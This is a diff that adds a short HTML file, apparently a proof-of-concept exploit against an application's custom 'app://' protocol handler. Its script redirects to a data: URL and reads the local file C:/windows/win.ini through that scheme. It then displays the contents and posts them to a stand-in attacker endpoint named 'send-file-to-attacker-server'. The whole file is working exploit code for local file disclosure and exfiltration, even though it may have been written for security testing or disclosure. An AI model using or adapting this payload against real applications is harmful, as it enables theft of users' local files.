@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+<script>
+    window.location = `data:text/html,<script>(${payload.toString()})()\x3c/script>`;
+
+    function payload() {
+        let command = 'app://8c27aae2823fae296e5a7ac31c9e5a812d9c//C:/windows/win.ini';
+        let r = new XMLHttpRequest();
+        r.open('GET', command);
+        r.addEventListener('load', e => {
+            let result = e.currentTarget.responseText;
+            console.log(result);
+            confirm(result)
+            fetch('http://example.localtest.me/send-file-to-attacker-server', {method: 'post', mode: 'no-cors', body: result})
+        });
+        r.send();
+    }
+</script>
+</body>
+</html>
